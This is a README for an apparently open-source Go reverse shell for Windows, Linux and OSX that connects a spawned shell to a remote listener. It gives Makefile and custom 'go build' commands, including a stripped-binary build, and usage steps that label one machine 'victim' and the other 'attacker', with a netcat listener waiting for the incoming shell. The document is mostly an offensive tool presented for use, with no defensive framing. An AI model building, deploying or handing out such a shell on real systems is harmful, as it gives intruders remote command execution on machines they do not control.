# Go reverse shell for Win/Linux/OSX

Small Go reverse shell for Windows, Linux and OSX.
Calls the given shell (`shellPath`) and redirects std-pipes to communicate with the server socket.
Tested with `go1.12`.

Similar reverse shells and partially based on:

* `https://gist.github.com/moloch--/86068b6019ff5e3280725230dcafa892`
* `https://github.com/FireFart/goshell`

## Usage & Building

### Building

Create a executables with `Makefile`:

* for Windows: `make win`
* for Windows with Powershell: `make winps`
* for Linux: `make linux`
* for OSX: `make osx`

#### Custom Build

`GOOS=<ARCH> go build -ldflags "-s -w -X main.shellPath=<PATH>" -o shell *.go`

### Usage

* On victim: `./shell <IP> <PORT>`
* On attacker: `nc -lvp <PORT>`
